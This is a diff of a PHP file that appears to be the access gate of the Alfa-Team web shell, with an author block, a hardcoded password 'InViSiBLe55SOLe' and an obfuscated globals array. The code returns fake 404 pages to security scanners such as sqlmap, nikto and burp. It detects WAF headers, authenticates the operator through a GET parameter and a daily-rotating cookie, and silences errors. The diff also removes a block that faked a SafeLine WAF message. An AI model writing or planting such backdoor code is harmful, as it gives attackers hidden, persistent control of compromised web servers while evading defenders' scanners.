@@ -1,4 +1,14 @@
 <?php
+/*
+	Author: 	Solevisible/Alfa-Team
+	Telegram: 	https://telegram.me/solevisible
+	YouTube: 	https://youtube.com/solevisible
+	Gmail:		solevisible@gmail.com
+	Date:		Monday, September 14, 2020
+*/
+
+$AUTH_KEY = 'InViSiBLe55SOLe';
+$PARAM_NAME = 'x';
 
 $blocked_agents = [
     'w3af', 'nikto', 'sqlmap', 'nmap', 'masscan', 'burp', 'zap', 'acunetix',
@@ -15,7 +25,6 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $ua = $_SERVER['HTTP_USER_AGENT'];
     foreach ($blocked_agents as $bad) {
         if (stripos($ua, $bad) !== false) {
-            // respon 404 palsu
             header('HTTP/1.0 404 Not Found');
             die('<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
                 . '<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>');
@@ -23,33 +32,26 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
-// ----- 2. Deteksi WAF via header -------------------------------------------------
+// Deteksi WAF via header
 $waf_headers = ['X-WAF', 'X-Sucuri-ID', 'X-Cloudflare', 'CF-RAY', 'X-Request-ID'];
 foreach ($waf_headers as $hdr) {
     $key = 'HTTP_' . strtoupper(str_replace('-', '_', $hdr));
     if (isset($_SERVER[$key])) {
-        // Ada WAF di depan – alihkan auth ke cookie (tidak lagi pakai GET)
+        // Ada WAF di depan → auth via cookie
         if (!isset($_COOKIE['alfa_auth']) || $_COOKIE['alfa_auth'] !== md5($AUTH_KEY . date('Y-m-d'))) {
             header('HTTP/1.0 403 Forbidden');
             die('Access Denied');
         }
-        // Cookie valid, lanjut
         break;
     }
 }
 
-// ----- 3. Rotasi parameter & key (obfuskasi) ------------------------------------
-// Setiap hari key berubah, scanner statik tidak akan cocok
+// Rotasi key harian + autentikasi (tetap pertahankan GET untuk kompatibilitas)
 $today = date('Ymd');
-$dynamic_key = md5($AUTH_KEY . $today);
-// Ubah nama parameter secara acak (tapi tetap pakai $PARAM_NAME asli)
-// Jika tidak ada WAF, gunakan skema asli, tapi tambahkan validasi cookie juga
 if (!isset($_COOKIE['alfa_auth']) && isset($_GET[$PARAM_NAME]) && $_GET[$PARAM_NAME] === $AUTH_KEY) {
-    // Login via GET berhasil → set cookie agar request berikutnya tetap hidup
     setcookie('alfa_auth', md5($AUTH_KEY . $today), time() + 86400, '/');
-    // Lanjutkan
 } elseif (!isset($_COOKIE['alfa_auth']) || $_COOKIE['alfa_auth'] !== md5($AUTH_KEY . $today)) {
-    // Jika tidak ada cookie dan GET salah → tolak
+    // Tidak ada cookie dan GET salah → tolak
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE html><html><head><title>Access Forbidden</title></head>'
         . '<body style="background:#0a0a0a;color:#ccc;font-family:Arial;text-align:center;padding:50px;">'
@@ -57,28 +59,9 @@ if (!isset($_COOKIE['alfa_auth']) && isset($_GET[$PARAM_NAME]) && $_GET[$PARAM_N
         . '<p>You don\'t have permission to access this resource.</p>'
         . '</body></html>');
 }
-// Hapus parameter GET agar tidak terlihat di URL setelah login (optional)
-unset($_GET[$PARAM_NAME]);
 
-// ----- 4. (Opsional) Sembunyikan pesan error yang terlalu eksplisit -----------
 error_reporting(0);
 ini_set('display_errors', 0);
-
-$AUTH_KEY = 'InViSiBLe55SOLe';
-$PARAM_NAME = 'x';
-
-if(!isset($_GET[$PARAM_NAME]) || $_GET[$PARAM_NAME] !== $AUTH_KEY) {
-    header('HTTP/1.0 403 Forbidden');
-    die('<!DOCTYPE html>
-    <html>
-    <head><title>Access Forbidden</title></head>
-    <body style="background:#0a0a0a;color:#ccc;font-family:Arial;text-align:center;padding:50px;">
-    <h1 style="color:#ff4444;">Access Forbidden</h1>
-    <p>You don\'t have permission to access this resource.</p>
-    <p>Security Detection Powered By SafeLine WAF</p>
-    </body>
-    </html>');
-}
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
